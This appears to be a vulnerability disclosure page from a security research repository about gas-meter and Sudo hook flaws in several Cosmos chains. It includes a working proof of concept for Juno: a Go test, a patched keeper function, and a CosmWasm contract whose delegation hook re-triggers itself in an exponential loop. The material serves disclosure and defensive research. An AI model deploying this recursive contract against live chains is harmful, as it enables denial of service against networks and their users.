# Pitfall 2

## Findings Summary

> See the [Per-Finding Index](../../README.md#per-finding-index) for the complete findings table with PoC types, fix status, and similarity values.

| # | Project | PoC Type | Issue Reference |
|---|---------|----------|-----------------|
| 9 | [Mantra](https://github.com/MANTRA-Chain/mantrachain) | UnitTest | [cosmos-sdk#25303](https://github.com/cosmos/cosmos-sdk/pull/25303) |
| 10 | [Neutron](https://github.com/neutron-org/neutron) | UnitTest | [neutron#978](https://github.com/neutron-org/neutron/pull/978) |
| 11 | [Tower](https://github.com/quasar-finance/quasar) | UnitTest | [before_send.go#L161](https://github.com/quasar-finance/quasar/blob/main/x/tokenfactory/keeper/before_send.go#L161) |
| 12 | [Phoenix](https://github.com/phoenix-directive/core) | UnitTest | [before_send.go#L144](https://github.com/jmesworld/core/blob/main/x/tokenfactory/keeper/before_send.go#L144) |
| 13 | [JMES](https://github.com/jmesworld/core) | UnitTest | [before_send.go#L144](https://github.com/jmesworld/core/blob/main/x/tokenfactory/keeper/before_send.go#L144) |
| 14 | [Symphony](https://github.com/Orchestra-Labs/symphony) | UnitTest | [before_send.go#L165](https://github.com/Orchestra-Labs/symphony/blob/main/x/tokenfactory/keeper/before_send.go#L165) |
| 15 | [Juno](https://github.com/CosmosContracts/juno) | Mock | [contracts.go#L70-L87](https://github.com/CosmosContracts/juno/blob/main/x/cw-hooks/keeper/contracts.go#L70-L87) |

---

<details>
<summary><b>Key Word Match</b></summary>

`/.WithGasMeter/ AND /\.Sudo/`

- For chain-registry project we just use below match pattern to find out all candidate project, and manually check them one by one. (see [record](../../record/record/withgasmeter/withgasmeter-usage.json))

`/\.withGasMeter/`

</details>

## PoC


### PoC #9–#14: TokenFactory (Mantra, Neutron, Tower, Phoenix, JMES, Symphony)

see [mantra-case](../../high-light-findings/mantra-tokenfactory/)


### PoC #15: Juno

**1. Add Below Test to juno project** 
Add below test to cwhook `x/auth/keeper/msg_server_test.go`
```go
func (s *KeeperTestSuite) TestContractExecution() {
	s.SetupTest()
	_, _, sender := testdata.KeyTestPubAddr()
	coin := sdk.NewCoins(sdk.NewCoin("stake", sdkmath.NewInt(1000000000000000000)), sdk.NewCoin("ujuno", sdkmath.NewInt(1000000000000000000)))
	s.FundAcc(sender, coin)
	wasmCode, err := os.ReadFile("...wasm")//use the wasm path you compiled in below poc contract!
	contractAddress := s.InstantiateContract(sender.String(), "", wasmCode)

	c := types.Contract{
		ContractAddress: contractAddress,
	}
	_, err = s.msgServer.RegisterStaking(s.Ctx, &types.MsgRegisterStaking{
		ContractAddress: contractAddress,
		RegisterAddress: sender.String(),
	})
	coin2 := sdk.NewCoins(sdk.NewCoin("stake", sdkmath.NewInt(1000000000000000000)), sdk.NewCoin("ujuno", sdkmath.NewInt(1000000000000000000)))
	addr2, err := sdk.AccAddressFromBech32(contractAddress)
	s.FundAcc(addr2, coin2)
	s.Require().NoError(err)
	resp, err := s.queryClient.StakingContracts(s.Ctx, &types.QueryStakingContractsRequest{})
	s.Require().NoError(err)
	s.Require().Contains(resp.Contracts, c.ContractAddress)

	vals, err := s.stakingKeeper.GetValidators(s.Ctx, 1)
	s.Require().NoError(err)
	val := vals[0]

	// == Delegate Tokens ==
	s.Require().NoError(err)
	_, err = s.stakingKeeper.Delegate(s.Ctx, sender, sdkmath.NewInt(1), stakingtypes.Bonded, val, false)
	s.Require().NoError(err)
	// query the contract to get the last modified shares (delegation)
	panic("aa")
}
```

**2. Modified the ExecuteContract to below version to Simplify verification steps** 
modife this file `x/cw-hooks/keeper/contracts.go` into below version.


The following modifications are mainly because when we check the execution results of each Sudo, the tx will fails when the transaction reaches MaxDepth. In order to simplify the implementation of the PoC contract, we modify your code to facilitate verification and easily understanding of the problem.

In fact, if we want to still construct an infinite recursive loop call without modification, we can also achieve it. We only need to add two additional variables in PoC contract to check the current depth during recursion, and when it reaches 500, it will return success instead of continuing the recursion. then the below check would pass.

```golang
func ExecuteContract(k wasmtypes.ContractOpsKeeper, childCtx sdk.Context, contractAddr sdk.AccAddress, msgBz []byte, err *error) {
	// Recover from panic, return error
	defer func() {
		if recoveryError := recover(); recoveryError != nil {
			// Determine error associated with panic
			if isOutofGas, msg := IsOutOfGasError(recoveryError); isOutofGas {
				*err = ErrOutOfGas.Wrapf("%s", msg)
			} else {
				*err = ErrContractExecutionPanic.Wrapf("%s", recoveryError)
			}
		}
	}()

	// Execute contract with sudo
	// _, *err = k.Sudo(childCtx, contractAddr, msgBz)
	k.Sudo(childCtx, contractAddr, msgBz)
}
```

**3. Compile the Below Contract which i already provided in `PoC.zip`**

[PoC.zip](./default.zip)

```rust
#[cfg(not(feature = "library"))]
use cosmwasm_std::entry_point;
use cosmwasm_std::to_binary;
use cosmwasm_std::{BankMsg, StakingMsg};
use cosmwasm_std::{
    Binary, Coin, CosmosMsg, Deps, DepsMut, Env, MessageInfo, ReplyOn, Response, StdResult, SubMsg,
    Uint128,
};
use cw2::set_contract_version;

use crate::error::ContractError;
use crate::msg::{CallCountResponse, InstantiateMsg, QueryMsg, SudoMsg};
use crate::state::{CALL_COUNT,MAX_COUNT, CREATOR};
use cosmwasm_std::Reply;

// version info for migration info
const CONTRACT_NAME: &str = "crates.io:infinite-track-delegation-hook";
const CONTRACT_VERSION: &str = env!("CARGO_PKG_VERSION");

/// Handling contract instantiation
#[cfg_attr(not(feature = "library"), entry_point)]
pub fn instantiate(
    deps: DepsMut,
    _env: Env,
    info: MessageInfo,
    _msg: InstantiateMsg,
) -> Result<Response, ContractError> {
    set_contract_version(deps.storage, CONTRACT_NAME, CONTRACT_VERSION)?;
    CREATOR.save(deps.storage, &info.sender)?;
    MAX_COUNT.save(deps.storage, &1)?;
    Ok(Response::new()
        .add_attribute("method", "instantiate")
        .add_attribute("creator", info.sender))
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn sudo(deps: DepsMut, _env: Env, msg: SudoMsg) -> Result<Response, ContractError> {
    match msg {
        SudoMsg::AfterDelegationModified(del) => {
            let delegate_amount = Coin {
                denom: "ujuno".to_string(),
                amount: Uint128::new(1),
            };
            let cosmos_msg1 = CosmosMsg::Staking(StakingMsg::Delegate {
                validator: del.validator_address.clone(),
                amount: delegate_amount.clone(),
            });
            Ok(Response::new().add_message(cosmos_msg1.clone()).add_message(cosmos_msg1.clone()))
        }
        SudoMsg::BeforeDelegationSharesModified(del) => {
            let mut resp = Response::new();
            Ok(resp)
        }
    }
}
```

**4. If successful you will get the following error message.**

This means that the attack has been successful as the transaction will be Infinit executed. Because there is a loop call greater than 2^500 times.

```bash
Running tool: /opt/homebrew/opt/go@1.22/bin/go test -timeout 30s -run ^TestKeeperTestSuite$ -testify.m ^(TestContractExecution)$ github.com/CosmosContracts/juno/v29/x/cw-hooks/keeper -tags=test

panic: test timed out after 30s
	running tests:
		TestKeeperTestSuite (30s)
		TestKeeperTestSuite/TestContractExecution (30s)

```


